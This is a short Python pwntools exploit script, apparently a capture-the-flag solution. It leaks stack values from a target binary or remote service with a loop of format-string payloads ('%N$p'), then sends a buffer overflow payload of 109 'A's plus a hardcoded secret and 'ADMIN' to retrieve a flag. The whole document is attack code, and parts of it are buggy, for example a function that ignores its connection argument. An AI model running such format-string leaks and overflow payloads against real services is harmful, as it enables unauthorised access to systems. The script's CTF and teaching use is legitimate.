from pwn import *
import sys

def find_secret(s):
    s = remote(host, port)
    s.sendline(b"%"+str(i).encode()+b"$p")
    d = s.recv()
    
    f = open("output.txt", "a")
    f.write(d.decode()+"\n")
    f.close()

    s.close()

def get_flag(s):
    s.sendline(b"A"*109+b"R@anD0mSecr3t"+b"ADMIN")
    d = s.recv()
    print(d)



f = open("output.txt", "w")
f.close()

for i in range(100):
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        s = remote(host, port)
    else:
        s = process('./main')
    find_secret(s)


if len(sys.argv) == 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
    s = remote(host, port)
else:
    s = process('./main')
get_flag(s)

